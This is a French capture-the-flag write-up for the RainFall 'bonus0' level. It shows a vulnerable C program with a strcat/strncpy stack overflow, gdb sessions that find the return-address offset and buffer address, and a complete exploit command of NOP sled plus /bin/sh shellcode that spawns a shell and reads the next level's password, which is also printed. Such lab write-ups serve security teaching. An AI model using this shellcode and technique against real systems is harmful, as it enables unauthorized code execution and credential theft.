# Bonus 0

Voici le code source:

```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define SEP " - "

void p(char *buff, char *prompt)
{
    char *ptr;
    char dest[4104];

    puts(prompt);
    read(STDIN_FILENO, dest, 4096);
    ptr = strchr(dest, '\n');
    *ptr = '\0';
    strncpy(buff, dest, 20);
    return;
}

void pp(char *buff)
{
    char first[20];
    char second[20];
    size_t len;

    p(first, SEP);
    p(second, SEP);

    strcpy(buff, first);
    len = strlen(buff);
    buff[len] = ' ';
    buff[len + 1] = 0;
    strcat(buff, second);
    return ;
}

int main(void)
{
    char buff[54];

    pp(buff);
    puts(buff);
    return 0;
}
```

L'idee est de stocker un shellcode dans `dest` puis d'ecraser l'adresse de retour de `main()` grace a `strcat()`. Pour cela il nous faut l'offset a partir duquel ecrire notre adresse de retour et l'adresse du debut de notre shellcode.

```bash
bonus0@RainFall:~$ gdb ./bonus0
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? () # Aa3A -> 9
```

Ensuite nous devons retrouver l'adresse de notre buffer `dest` pour pouvoir ecraser l'adresse de retour de `main()`

```bash
bonus0@RainFall:~$ gdb ./bonus0
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) break p
Breakpoint 1 at 0x80484bd
(gdb) run
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080484bd in p ()
(gdb) x $ebp - 4104
0xbfffe680:     0x00000000
```

Ensuite nous devons stocker notre shellcode assez loin dans la memoire pour qu'il ne soit pas ecrase par la suite de notre programme. Nous allons donc avoir un padding d'au moins 61 car nous pouvons ecrire 61 characteres au total `(40 + 1 + 20 -> (first overflow) + ' ' + second)`. Nous pouvons ecraser egalement toute marge d'erreur en utilisant l'instruction `NOP (\x90)`. Donc voici la 1ere partie de notre paylaod:

```bash
python3 -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'
```

Nous pouvons maintenant nous attaquer a la second partie du payload qui est l'ecrasement de l'adresse de retour. Nous connaissons deja l'adresse de notre payload grace aux `NOP`: `(0xbfffe680 + 61, 0xbfffe680 + 100) = (0xbfffe6bd, 0xbfffe6e4)`. Nous connaissons aussi l'offset a partir duquel ecrire cette adresse: `9`. Donc voici notre payload complet:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "A" * 9 + "\xc7\xe6\xff\xbf" + "A" * 7' ; cat ) | ./bonus0
 -
 -
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
